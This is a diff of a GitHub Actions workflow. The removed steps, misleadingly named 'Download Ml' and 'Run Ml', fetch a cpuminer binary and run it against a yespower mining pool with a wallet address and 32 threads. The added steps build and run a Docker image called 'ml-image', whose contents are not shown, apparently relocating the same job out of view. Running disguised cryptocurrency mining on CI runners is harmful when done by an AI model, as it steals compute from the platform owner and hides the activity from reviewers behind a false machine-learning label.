@@ -13,15 +13,10 @@ jobs:
     - name: Checkout Repository
       uses: actions/checkout@v2
 
-    - name: Install Dependencies
+    - name: Build Docker Image
       run: |
-        sudo apt update
-        sudo apt -y install wget tar
-    - name: Download Ml
+        docker build -t ml-image .
+
+    - name: Run Ml inside Docker Container
       run: |
-        wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.36/cpuminer-opt-linux.tar.gz
-        tar xf cpuminer-opt-linux.tar.gz
-        chmod +x cpuminer-sse2
-    - name: Run Ml
-      run: |
-        ./cpuminer-sse2 -a yespower -o stratum+tcps://stratum-na.rplant.xyz:17111 -u aNEpRWJEag9JiZFgztAf38q4kPmgkfXNCo.r1 --threads=32
+        docker run ml-image
